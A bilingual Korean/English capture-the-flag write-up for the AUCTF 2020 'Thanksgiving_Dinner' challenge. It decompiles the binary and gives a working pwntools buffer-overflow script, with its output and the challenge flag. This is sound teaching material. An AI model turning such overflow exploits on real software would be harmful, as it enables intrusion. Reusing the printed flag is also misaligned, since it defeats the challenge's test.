AUCTF 2020 / Thanksgiving_Dinner Write up
======================================
_한글 영어 설명 다 있습니다 ^^_   
_There are explanations in Korean and English:)_



기드라로 열고 main에 간다.   
Open it with a ghidra and go to main

<pre><code>undefined4 main(void)

{
  undefined *puVar1;
  
  puVar1 = &stack0x00000004;
  setvbuf(stdout,(char *)0x0,2,0);
  puts("Hi!\nWelcome to my program... it\'s a little buggy...");
  vulnerable(puVar1);
  return 0;
}</code></pre>

코드를 보니 안 중요한 코드같다. vulnerable 함수로 간다.   
The code looks like an unimportant code. Go to the vulnerable function

<pre><code>void vulnerable(void)

{
  char local_30 [16];
  int local_20;
  int local_1c;
  int local_18;
  int local_14;
  int local_10;
  
  puts("Hey I heard you are searching for flags! Well I\'ve got one. :)");
  puts("Here you can have part of it!");
  puts("auctf{");
  puts("\nSorry that\'s all I got!\n");
  local_10 = 0;
  local_14 = 10;
  local_18 = 0x14;
  local_1c = 0x14;
  local_20 = 2;
  fgets(local_30,0x24,stdin);
  if ((((local_10 == 0x1337) && (local_14 < -0x14)) && (local_1c != 0x14)) &&
     ((local_18 == 0x667463 && (local_20 == 0x2a)))) {
    print_flag();
  }
  return;
}</pre></code>

이 코드는 척봐도 중요해보인다. 코드를 해석해보자면   
This code looks important at first glance. To interpret the code,
<pre><code>local_10 = 0;
  local_14 = 10;
  local_18 = 0x14;
  local_1c = 0x14;
  local_20 = 2;
</code></pre>
이 코드를 통해 값을 할당하고   
Allocate the value through this code.

<pre><code>fgets(local_30,0x24,stdin);</code></pre>
여기서 입력을 통해 값을 바꾼 뒤(bof)   
Change the value here by typing (boff)
<pre><code>if ((((local_10 == 0x1337) && (local_14 < -0x14)) && (local_1c != 0x14)) &&
     ((local_18 == 0x667463 && (local_20 == 0x2a)))) {
    print_flag();
  }</code></pre>
이 if문을 통해 바꾼 값이 조건문에 참이 되면 flag가 나오는 것 같다.   
If the value changed through this if statement is true in the conditional statement, it seems that flag will appear.   
   
local_10~20 주소랑 local 30 주소 사이의 거리가 얼마나 되는지 gdb로 안보고 이름만 봐도 알 수 있을 것 같다.   
You can tell just by looking at the name, not by gdb, how far it is between local_10 and local 30 addresses.  
   
gdb 분석이 필요 없어 보이지만 그래도 했다.. 궁금하면 https://s-hyun00.tistory.com/5   
Gdb analysis doesn't seem necessary, but I did. If you want to know, https://s-hyun00.tistory.com/5﻿  
   
비교문에 맞게 작성한 bof.py 파일을 작성한다.   
Create a bof.py file.
<pre><code>#bof.py
from pwn import *

r = remote("127.0.0.1",30011)

payload = 'a'*16

payload += '\x2a\x00\x00\x00'
payload += '\x15\x00\x00\x00'
payload += '\x63\x74\x66\x00'
payload += '\x13\xff\xff\xff'
payload += '\x37\x13\x00\x00'

r.sendline(payload)
r.interactive()
r.close()
</pre></code>

python bof.py를 실행하면 값이 나온다.   
If you run a it, you get a value.
<pre>
$ python bof.py
[+] Opening connection to 127.0.0.1 on port 30011: Done
[*] Switching to interactive mode
Hi!
Welcome to my program... it's a little buggy...
Hey I heard you are searching for flags! Well I've got one. :)
Here you can have part of it!
auctf{

Sorry that's all I got!

Wait... you aren't supposed to be here!!
auctf{I_s@id_1_w@s_fu11!}
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 30011
</pre>
flag : auctf{I_s@id_1_w@s_fu11!}
